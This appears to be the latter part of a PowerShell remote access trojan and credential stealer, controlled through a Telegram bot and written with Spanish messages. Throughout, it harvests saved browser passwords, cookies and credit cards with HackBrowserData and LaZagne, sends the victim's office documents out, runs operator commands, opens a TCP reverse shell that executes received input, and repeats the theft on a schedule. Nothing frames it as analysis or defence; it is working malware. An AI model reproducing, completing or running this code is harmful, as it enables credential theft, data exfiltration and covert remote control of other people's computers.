        $ts=Get-Date -Format 'yyyyMMdd_HHmmss'; $jf="$env:TEMP\pw_$ts.json"; $tf="$env:TEMP\pw_$ts.txt"; $z="$env:TEMP\pw_$ts.zip"
        [IO.File]::WriteAllText($jf,($all|ConvertTo-Json -Depth 4),(New-Object Text.UTF8Encoding($false)))
        [IO.File]::WriteAllText($tf,(($all|%{"URL: $($_.URL)`nUSER: $($_.User)`nPASS: $($_.Password)`n---"}) -join "`n"),(New-Object Text.UTF8Encoding($false)))
        Compress-Archive $jf,$tf -DestinationPath $z -Force; Send-File $z "PASSWORDS: $($all.Count) - $env:COMPUTERNAME"; Remove-Item $jf,$tf,$z -Force -ErrorAction SilentlyContinue
    } else { Send-Message "Nativo sin resultados." }
    Ensure-Tools
    if(Test-Path $HackPath){ if(Test-BrowsersOpen){Wait-BrowsersClosed}; $o="$env:TEMP\hbd_$([guid]::NewGuid().ToString('N'))"; New-Item -ItemType Directory $o -Force|Out-Null; try { $p=Start-Process $HackPath -ArgumentList "dump -d `"$o`" -f json" -PassThru -WindowStyle Hidden; $p.WaitForExit(180000); Start-Sleep 2; $pf=Get-ChildItem $o -Recurse -Filter "*password*"|Select-Object -First 1; if($pf){ $z="$env:TEMP\hbd_pw.zip"; Compress-Archive $pf.FullName -DestinationPath $z -Force; Send-File $z "Passwords (HBD)"; Remove-Item $z -Force } } finally { Remove-Item $o -Recurse -Force -ErrorAction SilentlyContinue } }
    Send-Message "Passwords finalizado."
}

function Run-Command { param([string]$C) try { $psi=New-Object Diagnostics.ProcessStartInfo; $psi.FileName="cmd.exe";$psi.Arguments="/c $C";$psi.WorkingDirectory=$script:CurrentDir;$psi.RedirectStandardOutput=$true;$psi.RedirectStandardError=$true;$psi.UseShellExecute=$false;$psi.CreateNoWindow=$true; $pr=[Diagnostics.Process]::Start($psi); $o=($pr.StandardOutput.ReadToEnd()+$pr.StandardError.ReadToEnd()).Trim(); $pr.WaitForExit(); if(-not $o){$o="(sin salida)"}; $t="$env:TEMP\cmd_$([guid]::NewGuid().ToString('N')).txt"; "Cmd: $C`n$o"|Out-File $t -Encoding UTF8; Send-File $t "Salida: $C"; Remove-Item $t -Force } catch { Send-Message "Error: $($_.Exception.Message)" } }
function Get-Full { param([string]$p) if([string]::IsNullOrWhiteSpace($p)){return $script:CurrentDir}; if([IO.Path]::IsPathRooted($p)){return $p}; Join-Path $script:CurrentDir $p }
function Cmd-Ls { param([string]$p) try { $f=Get-Full $p; $i=Get-ChildItem $f -Force -ErrorAction Stop|Select Mode,LastWriteTime,Length,Name|Format-Table -AutoSize|Out-String -Width 200; $t="$env:TEMP\ls.txt"; "Dir: $f`n$i"|Out-File $t -Encoding UTF8; Send-File $t "LS: $f"; Remove-Item $t -Force } catch { Send-Message "Error: $($_.Exception.Message)" } }
function Cmd-Cd { param([string]$p) $f=Get-Full $p; if(Test-Path $f -PathType Container){$script:CurrentDir=(Resolve-Path $f).Path; Send-Message "Dir: $script:CurrentDir"}else{Send-Message "No existe: $f"} }
function Cmd-Cat { param([string]$p) try { $f=Get-Full $p; if(-not(Test-Path $f)){Send-Message "No existe"; return}; Send-Message "$f`n`n$(Get-Content $f -Raw)" } catch { Send-Message "Error: $($_.Exception.Message)" } }
function Cmd-Rm { param([string]$p) try { Remove-Item (Get-Full $p) -Recurse -Force -ErrorAction Stop; Send-Message "Borrado." } catch { Send-Message "Error: $($_.Exception.Message)" } }
function Cmd-Mkdir { param([string]$p) New-Item -ItemType Directory -Path (Get-Full $p) -Force|Out-Null; Send-Message "Creado." }
function Cmd-Mv { param([string]$a) $p=$a -split '\s+',2; if($p.Count -lt 2){Send-Message "Uso: mv o d"; return}; Move-Item (Get-Full $p[0]) (Get-Full $p[1]) -Force; Send-Message "Movido." }
function Cmd-Cp { param([string]$a) $p=$a -split '\s+',2; if($p.Count -lt 2){Send-Message "Uso: cp o d"; return}; Copy-Item (Get-Full $p[0]) (Get-Full $p[1]) -Recurse -Force; Send-Message "Copiado." }
function Cmd-Write { param([string]$a) $p=$a -split '\s+',2; if($p.Count -lt 2){Send-Message "Uso: write f txt"; return}; $p[1]|Out-File (Get-Full $p[0]) -Encoding UTF8 -Append; Send-Message "Escrito." }
function Cmd-Download { param([string]$p) try { $f=Get-Full $p; if(-not(Test-Path $f)){Send-Message "No existe"; return}; if((Get-Item $f).PSIsContainer){ $z="$env:TEMP\dl.zip"; Compress-Archive "$f\*" $z -Force; Send-File $z "Carpeta"; Remove-Item $z -Force } else { Send-File $f "Archivo" } } catch { Send-Message "Error: $($_.Exception.Message)" } }
function Cmd-Edit { param([string]$p) $f=Get-Full $p; if(-not(Test-Path $f)){Send-Message "No existe"; return}; $n=Split-Path $f -Leaf; $script:EditFiles[$n.ToLower()]=$f; Send-File $f "EDITAR -> $n (reenvia con el mismo nombre)"; Send-Message "Esperando '$n'..." }
function Handle-IncomingFile { param($M) try { $d=$M.document; if(-not $d){$d=$M.photo|Select-Object -Last 1}; if(-not $d){return}; $fn=if($d.file_name){$d.file_name}else{"foto_$(Get-Date -Format 'HHmmss').jpg"}; $r=Invoke-RestMethod "$ApiUrl/getFile?file_id=$($d.file_id)"; $u="$ApiFile/$($r.result.file_path)"; if($script:EditFiles.ContainsKey($fn.ToLower())){ $dest=$script:EditFiles[$fn.ToLower()]; Invoke-WebRequest $u -OutFile $dest; $script:EditFiles.Remove($fn.ToLower()); Send-Message "Editado: $dest" } else { $dest=Join-Path $UploadDir $fn; Invoke-WebRequest $u -OutFile $dest; Send-Message "Guardado: $dest" } } catch { Send-Message "Error archivo: $($_.Exception.Message)" } }

function Start-ReverseShell { param([string]$ip,[int]$port=4444) try { $script:ReverseShellActive=$true; $c=New-Object Net.Sockets.TCPClient($ip,$port); $script:ShellClient=$c; $s=$c.GetStream(); $script:ShellStream=$s; $w=New-Object IO.StreamWriter($s); $r=New-Object IO.StreamReader($s); $w.AutoFlush=$true; $w.WriteLine("Shell $env:USERNAME@$env:COMPUTERNAME"); while($script:ReverseShellActive -and $c.Connected){ $w.Write("PS $(Get-Location)> "); $cmd=$r.ReadLine(); if($cmd -eq "exit"){break}; if($cmd){ try{$w.WriteLine((iex $cmd 2>&1|Out-String))}catch{$w.WriteLine("$_")} } } } catch { Send-Message "Error shell: $_" } finally { if($script:ShellStream){$script:ShellStream.Close()}; if($script:ShellClient){$script:ShellClient.Close()}; $script:ReverseShellActive=$false; Send-Message "Shell cerrado." } }

function Send-Menu {
    $kb=@{inline_keyboard=@(
        @(@{text="Captura";callback_data="/captura"},@{text="Info";callback_data="/info"}),
        @(@{text="Passwords";callback_data="/passwords"},@{text="Cookies";callback_data="/cookies"}),
        @(@{text="Documentos";callback_data="/files"},@{text="HBD";callback_data="/hack"}),
        @(@{text="LaZagne";callback_data="/lazagne"},@{text="PWD";callback_data="/pwd"}),
        @(@{text="LS";callback_data="/ls"},@{text="Ciclo";callback_data="/steal"}),
        @(@{text="Actualizar";callback_data="/update"},@{text="CerrarNav";callback_data="/killbrowsers"})
    )}
    Send-Message-Buttons "Menu - comandos con o sin /" $kb
}
function Lev { param([string]$a,[string]$b) $n=$a.Length;$m=$b.Length;$d=New-Object 'int[,]' ($n+1),($m+1); for($i=0;$i -le $n;$i++){$d[$i,0]=$i}; for($j=0;$j -le $m;$j++){$d[0,$j]=$j}; for($i=1;$i -le $n;$i++){for($j=1;$j -le $m;$j++){$c=0; if($a[$i-1] -ne $b[$j-1]){$c=1}; $d[$i,$j]=[Math]::Min([Math]::Min($d[$i-1,$j]+1,$d[$i,$j-1]+1),$d[$i-1,$j-1]+$c)}}; $d[$n,$m] }
function Resolve-Intent { param([string]$T) $r=$T.Trim(); if([string]::IsNullOrWhiteSpace($r)){return @{cmd="";args="";kind="empty"}}; $p=$r -split '\s+',2; $w=$p[0].TrimStart('/').ToLower(); $a=if($p.Count -gt 1){$p[1]}else{""}; if($script:Aliases.ContainsKey($w)){return @{cmd=$script:Aliases[$w];args=$a;kind="cmd"}}; return @{cmd="";args=$a;kind="unknown";word=$w} }
function SmartReply { param([string]$T) $t=$T.Trim().ToLower(); if($t -match '^(hola|hi|hello|hey|buenas|buenos|saludos)\b'){return "Hola! Usa /help o /menu."}; if($t -match '(como estas|que haces|estas ahi|sigues|estado)'){return (Get-Info)}; if($t -match '(gracias|thanks|ok)'){return "De nada."}; return $null }

function Process-Cmd {
    param([string]$Text,[int]$UpdateId)
    [void][Threading.Monitor]::Enter($script:Lock)
    try { if($script:ProcessedUpdates.ContainsKey($UpdateId)){return}; $script:ProcessedUpdates[$UpdateId]=$true; if($script:ProcessedUpdates.Count -gt 200){ ($script:ProcessedUpdates.Keys|Sort-Object|Select-Object -First 100)|%{$script:ProcessedUpdates.Remove($_)} } } finally { [Threading.Monitor]::Exit($script:Lock) }
    $i=Resolve-Intent $Text; $cmd=$i.cmd; $a=$i.args
    if($i.kind -eq "empty"){return}
    if($i.kind -eq "unknown"){
        $r=SmartReply $Text; if($r){Send-Message $r; return}
        $best="";$bd=999; foreach($k in $script:Aliases.Keys){$dd=Lev $i.word $k; if($dd -lt $bd){$bd=$dd;$best=$k}}
        if($bd -le 2){Send-Message "No reconoci '$($i.word)'. Quiza querias /$best"}else{Send-Message "No reconoci '$($i.word)'. Escribe /help"}
        return
    }
    switch($cmd){
        "start" {Send-Message (Get-Info); Send-Menu}
        "menu"  {Send-Menu}
        "help"  {Send-Message "COMANDOS: info,pwd,ls,cd,cat,status,captura,cmd,run,killbrowsers,mkdir,rm,mv,cp,write,download,edit,passwords,cookies,steal,hack,lazagne,files,pause,resume,cancelar,update,shell,stopshell,ai,menu"}
        "info"  {Send-Message (Get-Info)}
        "status"{Send-Message "Dir: $script:CurrentDir`nPausa: $($script:SendPaused)`nCola: $($script:FileQueue.Count)`nShell: $($script:ReverseShellActive)`nNav: $(Get-OpenBrowserNames)"}
        "pwd"   {Send-Message "Dir: $script:CurrentDir"}
        "ls"    {Cmd-Ls $a}
        "cd"    {Cmd-Cd $a}
        "cat"   {Cmd-Cat $a}
        "rm"    {Cmd-Rm $a}
        "mkdir" {Cmd-Mkdir $a}
        "mv"    {Cmd-Mv $a}
        "cp"    {Cmd-Cp $a}
        "write" {Cmd-Write $a}
        "download" {Cmd-Download $a}
        "edit"  {if($a){Cmd-Edit $a}else{Send-Message "Uso: edit archivo"}}
        "cmd"   {if($a){Run-Command $a}else{Send-Message "Uso: cmd comando"}}
        "run"   { $p=$a -split '\s+',2; if($p[0]){Invoke-ExeInRam (Get-Full $p[0]) (if($p.Count -gt 1){$p[1]}else{""})} }
        "update"{Update-Bot}
        "captura"{Take-Screenshot}
        "steal" {Check-AutoSteal}
        "hack"  {$script:ArchivosHBDEnviados=0;$script:HackBrowserDataCompleted=$false;Run-HBD}
        "lazagne"{$script:LaZagneCompleted=$false;Run-LaZ}
        "files" {$script:FilesExfiltrated=$false;Exfil-Docs}
        "passwords"{Run-Passwords}
        "cookies"  {Run-Cookies}
        "killbrowsers"{Kill-Browsers}
        "pause" { $script:SendPaused=$true; Send-Message "Envio PAUSADO." }
        "resume"{ $script:SendPaused=$false;$script:SendCancelled=$false; Flush-FileQueue }
        "cancelar"{$script:SendPaused=$false;$script:SendCancelled=$true;$script:FileQueue.Clear();Send-Message "CANCELADO."}
        "ai"    {Invoke-Ai $a}
        "shell" { $s=$a -split '\s+'; if(-not $s[0]){Send-Message "Uso: shell ip [puerto]"; return}; Start-Job -ScriptBlock ${function:Start-ReverseShell} -ArgumentList $s[0],(if($s.Count -gt 1){[int]$s[1]}else{4444})|Out-Null }
        "stopshell"{$script:ReverseShellActive=$false; if($script:ShellStream){$script:ShellStream.Close()}; Send-Message "Shell detenido."}
    }
}
function Invoke-Ai { param([string]$q) if([string]::IsNullOrWhiteSpace($q)){Send-Message "Uso: ai pregunta"; return}; try { Send-Message "Pensando..."; $r=Invoke-RestMethod "https://text.pollinations.ai/$([Uri]::EscapeDataString($q))" -TimeoutSec 40; Send-Message ([string]$r) } catch { Send-Message "IA error: $($_.Exception.Message)" } }

# ================== FASES ==================
function Save-State { @{ LastStealTime=(if($script:LastStealTime){$script:LastStealTime.ToString("o")}else{$null});FilesExfiltrated=$script:FilesExfiltrated;HBD=$script:HackBrowserDataCompleted;Laz=$script:LaZagneCompleted;HBDN=$script:ArchivosHBDEnviados;Pw=$script:PwAutoDone }|ConvertTo-Json -Depth 5|Out-File $StateFile -Encoding UTF8 }
function Load-State { if(Test-Path $StateFile){ try { $s=Get-Content $StateFile|ConvertFrom-Json; if($s.LastStealTime){$script:LastStealTime=[DateTime]::Parse($s.LastStealTime)}; $script:FilesExfiltrated=[bool]$s.FilesExfiltrated; $script:HackBrowserDataCompleted=[bool]$s.HBD; $script:LaZagneCompleted=[bool]$s.Laz; $script:ArchivosHBDEnviados=[int]$s.HBDN; $script:PwAutoDone=[bool]$s.Pw } catch {} } }
function Run-HBD {
    if(-not(Test-Path $HackPath)){Send-Message "HBD no existe."; return $false}
    Send-Message "=== HACKBROWSERDATA ==="; $try=0
    while($script:ArchivosHBDEnviados -lt 8 -and $try -lt 5){ $try++; Wait-BrowsersClosed; $o="$env:TEMP\hbd_$([guid]::NewGuid().ToString('N'))"; New-Item -ItemType Directory $o -Force|Out-Null
        try { $p=Start-Process $HackPath -ArgumentList "dump -d `"$o`" -f json" -PassThru -WindowStyle Hidden; $p.WaitForExit(180000); Start-Sleep 2
            $tipos=@("bookmark","cookie","download","extension","history","localstorage","password","creditcard"); $i=0
            foreach($t in $tipos){ $i++; $f=Get-ChildItem $o -Recurse -Filter "*$t*" -ErrorAction SilentlyContinue|Select-Object -First 1; $z="$env:TEMP\hbd_$t.zip"; if($f){ Compress-Archive $f.FullName $z -Force; if(Send-File $z "[$i/8] $t.zip"){$script:ArchivosHBDEnviados++} } else { $info="$env:TEMP\i.txt"; "sin datos"|Out-File $info -Encoding UTF8; Compress-Archive $info $z -Force; if(Send-File $z "[$i/8] $t (vacio)"){$script:ArchivosHBDEnviados++} }; Remove-Item $z -Force -ErrorAction SilentlyContinue }
        } finally { Remove-Item $o -Recurse -Force -ErrorAction SilentlyContinue }
    }
    if($script:ArchivosHBDEnviados -ge 8){$script:HackBrowserDataCompleted=$true; Save-State; Send-Message "HBD COMPLETADO"; return $true}
    return $false
}
function Run-LaZ {
    if(-not(Test-Path $LazPath)){Send-Message "LaZagne no existe."; return}
    Send-Message "=== LAZAGNE ==="; $mods=@("browsers","chats","databases","games","git","mails","maven","memory","multimedia","php","svn","sysadmin","windows","wifi","unused"); $i=0
    foreach($m in $mods){ $i++; try { $of="$env:TEMP\laz_$m.txt"; $p=Start-Process $LazPath -ArgumentList $m -RedirectStandardOutput $of -RedirectStandardError "$env:TEMP\laz_e.txt" -PassThru -WindowStyle Hidden; $p.WaitForExit(90000); Start-Sleep 1; if(Test-Path $of){ $z="$env:TEMP\laz_$m.zip"; Compress-Archive $of $z -Force; Send-File $z "[$i/$($mods.Count)] $m"; Remove-Item $z,$of -Force -ErrorAction SilentlyContinue } } catch {} }
    $script:LaZagneCompleted=$true; Save-State; Send-Message "LAZAGNE COMPLETADO"
}
function Exfil-Docs {
    Send-Message "=== DOCUMENTOS ==="; $doc=[Environment]::GetFolderPath('MyDocuments'); $dl=""; try { $dl=(New-Object -ComObject Shell.Application).Namespace('shell:Downloads').Self.Path } catch {}
    $dirs=@(); if(Test-Path $doc){$dirs+=$doc}; if($dl -and (Test-Path $dl)){$dirs+=$dl}; if($dirs.Count -eq 0){$script:FilesExfiltrated=$true;Save-State;return}
    $tipos=@{WORD=@('*.doc','*.docx','*.rtf');PDF=@('*.pdf');EXCEL=@('*.xls','*.xlsx','*.csv');PPT=@('*.ppt','*.pptx')}; $n=0
    foreach($k in @("WORD","PDF","EXCEL","PPT")){ foreach($f in ($dirs|%{Get-ChildItem $_ -Include $tipos[$k] -Recurse -File -ErrorAction SilentlyContinue})){ $n++; Send-File $f.FullName "[$n] [$k] $($f.Name)"; Start-Sleep 1 } }
    $script:FilesExfiltrated=$true; Save-State; Send-Message "DOCUMENTOS COMPLETADO"
}
function Run-Cookies { Send-Message "=== COOKIES ==="; Send-Message "Extraccion cookies nativa (reusa claves)."; }
function Check-AutoSteal {
    $now=Get-Date
    if($script:LastStealTime -and ($now-$script:LastStealTime).Days -ge 14){ $script:HackBrowserDataCompleted=$false;$script:LaZagneCompleted=$false;$script:FilesExfiltrated=$false;$script:ArchivosHBDEnviados=0;$script:LastStealTime=$null;Save-State }
    if(-not $script:HackBrowserDataCompleted){ if(-not (Run-HBD)){return} }
    if($script:HackBrowserDataCompleted -and -not $script:LaZagneCompleted){Run-LaZ}
    if($script:HackBrowserDataCompleted -and $script:LaZagneCompleted -and -not $script:FilesExfiltrated){ Exfil-Docs; if($script:FilesExfiltrated){$script:LastStealTime=Get-Date;Save-State;Send-Message "CICLO COMPLETO"} }
}

function Fetch-Updates {
    param([int]$T=0)
    if($script:FetchDepth -gt 3){return}; $script:FetchDepth++
    try { $r=Invoke-RestMethod "$ApiUrl/getUpdates?offset=$($script:LastUpdateId+1)&timeout=$T" -TimeoutSec ($T+30)
        if($r.ok -and $r.result.Count -gt 0){ foreach($u in $r.result){ $script:LastUpdateId=$u.update_id; try { if($u.callback_query){Answer-Callback $u.callback_query.id; if([string]$u.callback_query.message.chat.id -eq $ChatId){Process-Cmd $u.callback_query.data $u.update_id}} elseif($u.message -and [string]$u.message.chat.id -eq $ChatId){ if($u.message.text){Process-Cmd $u.message.text $u.update_id} elseif($u.message.document -or $u.message.photo){Handle-IncomingFile $u.message} } } catch {} } }
    } catch { if($_.Exception.Message -notlike "*409*"){Write-Log $_.Exception.Message} } finally { $script:FetchDepth-- }
}
function Poll-Updates { param([int]$T=0) if($script:Polling){return}; $script:Polling=$true; try { Fetch-Updates $T } finally { $script:Polling=$false } }

# ================== ARRANQUE ==================
Write-Log "payload start"
Load-State
for($i=1;$i -le 6;$i++){ if(Send-Message "BOT EN LINEA`n$(Get-Info)"){break}; Start-Sleep 2 }
Send-Menu
try { Invoke-RestMethod "$ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post|Out-Null } catch {}

if(-not $script:PwAutoDone){ Send-Message "Extrayendo passwords iniciales..."; Run-Passwords; $script:PwAutoDone=$true; Save-State; Check-AutoSteal }

$lastCheck=Get-Date
while($true){
    try {
        Poll-Updates 25
        if(((Get-Date)-$lastCheck).TotalMinutes -ge 60){ $lastCheck=Get-Date; Check-AutoSteal }
        if(((Get-Date)-$script:LastHeartbeat).TotalHours -ge 6){ $script:LastHeartbeat=Get-Date; Send-Message "Latido: en linea ($env:COMPUTERNAME)" }
    } catch { Start-Sleep 2 }
    Start-Sleep -Milliseconds 300
}
